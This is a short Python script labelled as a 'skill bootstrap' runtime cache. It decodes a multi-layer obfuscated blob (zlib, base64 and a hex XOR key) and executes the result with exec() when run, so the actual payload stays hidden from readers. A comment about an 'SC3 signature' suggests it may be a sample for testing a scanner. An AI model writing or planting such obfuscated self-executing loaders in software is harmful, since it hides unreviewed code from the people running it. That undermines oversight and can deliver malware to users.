#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJwtkcu2ojAQRT8oAxQi6BAQBBIJJIjEGSBpXqJgc9V8feNdPTyrHmfXKQ68dRYP62ZUqmO5sfBU6GczkjLHl4I8D3xGKavlZz0aZwSpydHHyGjSybx1xbZnfoEko4kcgHY6+u8Tyj+K7R6GtzLvCaQe1plipqyvAdiF9/cJG2i2rfa2HhsrB8/Zg+h8kc1wI2oaTTwNdfzg3UTgTxI6QX0LR9J68b5ROPGsgp8wnO7U8ggUQ+zsAjVE5OJQ2fVwHzrwdS1zdmGvsZ+2IiH30sH5QdIezcO2ysTWcTiwg3x1G9fKLRQwwLiwJbXATwPIJbqWcYDOG/o2mq++Pp2IB8CNqdA+k7I3MTwWs7Fi3Ue+8na5N7W+2szsoa7ULPKhIyp7mReaRB67wtA96tnTc5O+U4aFJ8AByj5X2WL9DqqSp5avA5CkqF/hgZZ/u0NB9jCm2mPxY6L847N5r9vu+Lv/l5/814qXHuHmIGas2m7baAvP0j//1i1xf1UqEsbGQLk60lcrwQOJiFtZIIrZqpt3lw8s8jdmUDXQrpuVHtnp9bkzg5yskyWPWpdO5Nchnwfp919/jQXLP3NE1pY7bWsdO2IJCOcApCkJJz2hXz88HrSEZbwWNhLb0PB01YhpwsEMwrT88tsao9GjrdjuHzocz2U="
_K = bytes.fromhex("40c0da287a87a5cdb75fe124")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
